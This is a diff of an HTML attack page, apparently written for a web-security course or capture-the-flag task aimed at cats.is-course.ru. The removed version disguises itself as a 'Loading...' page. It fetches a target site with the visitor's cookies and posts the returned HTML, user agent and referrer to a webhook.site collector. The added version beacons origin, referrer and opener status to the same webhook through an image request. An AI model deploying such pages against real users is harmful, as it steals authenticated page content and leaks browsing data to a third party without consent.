@@ -1,65 +1,17 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Loading...</title>
-</head>
 <body>
-    <h1>Please wait...</h1>
-    <script>
-        // Получаем URL из параметра или используем referrer
-        const targetUrl = new URLSearchParams(window.location.search).get('url') || document.referrer || 'https://cats.is-course.ru';
-        const webhookUrl = 'https://webhook.site/eac24f4c-67b5-4837-bcc9-2740091b6393';
-        
-        // Делаем fetch к целевому сайту
-        fetch(targetUrl, {
-            method: 'GET',
-            credentials: 'include', // включаем cookies
-            mode: 'cors'
-        })
-        .then(response => {
-            console.log('Response status:', response.status);
-            return response.text();
-        })
-        .then(html => {
-            console.log('Got HTML, length:', html.length);
-            
-            // Отправляем HTML на webhook
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    target_url: targetUrl,
-                    html_content: html.substring(0, 50000),
-                    content_length: html.length,
-                    timestamp: new Date().toISOString(),
-                    user_agent: navigator.userAgent,
-                    referrer: document.referrer
-                })
-            })
-            .then(() => {
-                document.body.innerHTML = '<h1>Data sent successfully!</h1>';
-            })
-            .catch(err => {
-                document.body.innerHTML = '<h1>Error sending data</h1><p>' + err + '</p>';
-            });
-        })
-        .catch(err => {
-            console.error('Fetch error:', err);
-            
-            // Отправляем ошибку на webhook
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    error: err.toString(),
-                    target_url: targetUrl,
-                    timestamp: new Date().toISOString(),
-                    user_agent: navigator.userAgent
-                })
-            }).catch(() => {});
-            
-            document.body.innerHTML = '<h1>Error fetching target</h1><p>' + err + '</p>';
-        });
-    </script>
+<h1>Test page</h1>
+<script>
+const webhook = 'https://webhook.site/eac24f4c-67b5-4837-bcc9-2740091b6393';
+
+const url = new URL(webhook);
+url.searchParams.set('event', 'page_opened');
+url.searchParams.set('origin', location.origin);
+url.searchParams.set('referrer', document.referrer);
+url.searchParams.set('opener', String(!!window.opener));
+
+new Image().src = url.toString();
+</script>
 </body>
 </html>
